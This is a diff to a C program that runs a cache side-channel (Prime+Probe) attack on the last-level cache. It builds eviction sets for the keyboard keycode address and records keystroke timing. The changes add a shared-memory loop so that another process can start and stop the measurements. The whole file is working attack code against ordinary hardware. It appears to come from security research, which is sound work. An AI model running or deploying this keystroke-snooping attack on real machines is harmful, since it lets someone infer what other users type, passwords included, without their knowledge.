@@ -1,3 +1,4 @@
+#define _XOPEN_SOURCE 700
 #include <fcntl.h>
 #include <sched.h>
 #include <signal.h>
@@ -6,6 +7,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
+#include <sys/types.h>
 #include <unistd.h>
 #include <x86intrin.h>
 
@@ -20,6 +22,7 @@ void *mapping_start;
 EvictionSet **es_list;
 unsigned int core_id = 0;
 FILE *file;
+int shm_fd;
 
 void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
   fclose(file);
@@ -29,6 +32,7 @@ void cleanup(EvictionSet **es_listl, void *mapping_start, FILE *file) {
 void handle_sigint(int sig) {
   safe_print("SIGINT received, cleanup process initiated\n");
   cleanup(es_list, mapping_start, file);
+  shm_unlink("ipc_signals");
   exit(1);
 }
 
@@ -169,10 +173,7 @@ uint64_t *profile_slices(int set) {
   return size;
 }
 
-uint64_t measure_keystroke(int threshold) {
-  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
-  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
-  int eslist_index = get_evset_index(slice);
+uint64_t measure_keystroke(int threshold, int eslist_index) {
   uint8_t probemap[1024 * 1024];
   uint64_t keystrokes[64 * 64];
 
@@ -180,6 +181,7 @@ uint64_t measure_keystroke(int threshold) {
   uint64_t start_time = __rdtscp(&core_id);
   flush_timestamps(&start_time, 1, "pp_keystrokes.bin");
   printf("please start typing\n");
+
   for (int i = 0; i < 10; i++) {
     // takes around 1s to fill up 1 MB buffer
     uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
@@ -220,15 +222,93 @@ void measure_keystroke_without_slice(int threshold) {
   for (int i = 0; i < 4; i++) {
     printf("%lu\n", total_strokes[i]);
   }
+  printf("\nloaded time: %lu\n",
+         (start_time / 3400000)); // translate cycles to ms
+}
+
+void run_measure_keystroke_nosim() {
+  init_mapping();
+  es_list = get_all_slices_eviction_sets(mapping_start, 428);
+  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
+  int eslist_index = get_evset_index(slice);
+  measure_keystroke(threshold_from_flush(mapping_start), eslist_index);
+  free_es_list(es_list);
+  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
+}
+
+void measure_keystroke_sim(int threshold, int eslist_index, void **shm_ptr) {
+  uint8_t probemap[1024 * 1024];
+  uint64_t keystrokes[64 * 64];
+
+  uint64_t num_keystrokes = 0;
+  uint64_t start_time = __rdtscp(&core_id);
+  flush_timestamps(&start_time, 1, (char *)(*shm_ptr + 3));
+
+  while (!*(volatile char *)(*shm_ptr + 1)) {
+    // takes around 1s to fill up 1 mb buffer
+    uint64_t size = prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY,
+                                probemap, 1024 * 1024, keystrokes, threshold);
+    flush_timestamps(keystrokes, size, (char *)(*shm_ptr + 3));
+    num_keystrokes += size;
+  }
 }
 
 int main() {
+  signal(SIGINT, handle_sigint);
+  /* create shared memory for inter-process communication */
+  shm_fd = shm_open("ipc_signals", O_CREAT | O_RDWR, 0666);
+  ftruncate(shm_fd, 4096);
+  void *shm_ptr = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+
+  /* machine is not ready when eviction set is not found */
+  *(volatile char *)shm_ptr = 0;
+
   init_mapping();
-  printf("set: %d, slice: %d\n", pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES),
-         get_i7_2600_slice(KBD_KEYCODE_ADDR));
-  // es_list = get_all_slices_eviction_sets(mapping_start, 428);
-  // measure_keystroke(threshold_from_flush(mapping_start));
-  // free_es_list(es_list);
+  es_list = get_all_slices_eviction_sets(mapping_start, 428);
+  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+  int slice = get_i7_2600_slice(KBD_KEYCODE_ADDR);
+  int eslist_index = get_evset_index(slice);
+  int threshold = threshold_from_flush(mapping_start);
+
+  *(volatile char *)shm_ptr = 1;
+  printf("shared machine state updated to RDY\n");
+
+  do {
+    while (!*(volatile char *)(shm_ptr + 2))
+      ; // spinlock for acknowledgement
+    *(volatile char *)(shm_ptr) = 0;
+    printf("shared machine state updated to BUSY\n");
+
+    /* measure keystrokes */
+    printf("measure keystroke start \n");
+    uint8_t probemap[1024 * 1024];
+    uint64_t keystrokes[64 * 64];
+
+    uint64_t num_keystrokes = 0;
+    uint64_t start_time = __rdtscp(&core_id);
+    flush_timestamps(&start_time, 1, (char *)(shm_ptr + 3));
+    printf("start timestamp flushed\n");
+    printf("%s\n", (char *)(shm_ptr + 3));
+
+    while (!*(volatile char *)(shm_ptr + 1)) {
+      // takes around 1s to fill up 1 MB buffer
+      uint64_t size =
+          prime_probe(es_list[eslist_index], EVERGLADES_ASSOCIATIVITY, probemap,
+                      1024 * 1024, keystrokes, threshold);
+      flush_timestamps(keystrokes, size, (char *)(shm_ptr + 3));
+      num_keystrokes += size;
+    }
+    /* -------------------------------------*/
+
+    /* update machine state */
+    *(volatile char *)(shm_ptr) = 1;
+    printf("shared machine state updated to RDY\n");
+  } while (*(volatile char *)(shm_ptr + 1) != 2);
+  free_es_list(es_list);
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
+  close(shm_fd);
+  shm_unlink("ipc_signals");
+  printf("shared memory unlinked\n");
   return 0;
 }
